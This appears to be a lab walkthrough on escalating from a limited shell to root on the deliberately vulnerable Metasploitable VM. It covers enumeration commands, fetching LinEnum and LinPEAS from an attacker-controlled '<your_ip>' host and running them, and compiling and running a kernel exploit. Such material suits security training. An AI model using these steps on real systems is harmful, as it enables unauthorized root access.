🔓 Privilege Escalation – Metasploitable

In this phase, we aim to escalate our privileges from a limited shell (e.g., `msfadmin`, `user`, etc.) to `root` using local enumeration and known vulnerabilities.

---

## 🧭 Step 1: System Enumeration

Once you have a shell, start with basic recon:

```bash
uname -a
cat /etc/issue
id
whoami
````

Look for:

* Kernel version
* OS distribution
* User privileges
* Writable directories
* Scheduled jobs

---

## 🛠️ Step 2: Use Enumeration Scripts

### ➤ Option 1: LinEnum

```bash
wget http://<your_ip>/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### ➤ Option 2: LinPEAS

```bash
wget http://<your_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

These tools highlight:

* SUID binaries
* Weak file permissions
* Misconfigured services
* Cron jobs
* Environment variables

---

## 📌 Common PrivEsc Vectors on Metasploitable

### 🔹 1. Kernel Exploits

Run `uname -r`:

```bash
uname -r
# Example: 2.6.24-16-server
```

Search on Exploit-DB:

```bash
searchsploit 2.6.24
```

Try:

* **Dirty COW** (`dirtycow.c`)
* **Overlayfs** (`overlayfs_local_root_priv_esc.c`)

### 🔹 2. Weak NFS / Cron Permissions

Check crontab:

```bash
cat /etc/crontab
```

Look for writable scripts being executed on a schedule.

### 🔹 3. Misconfigured Services

Check for services running as root that can be hijacked:

```bash
ps aux | grep root
```

Look for poorly configured services, like:

* MySQL with root shell command
* SUID binaries in `/usr/bin`

---

## 🔥 Example: Using a Kernel Exploit

```bash
# Download and compile exploit
gcc 9542.c -o exploit
./exploit
```

✅ Result:

```bash
# whoami
root
```

---

## ✅ Confirm Root Access

Once you’ve escalated privileges:

```bash
whoami
id
hostname
```

Create a proof:

```bash
echo "Rooted Metasploitable!" > /root/pwned.txt
```
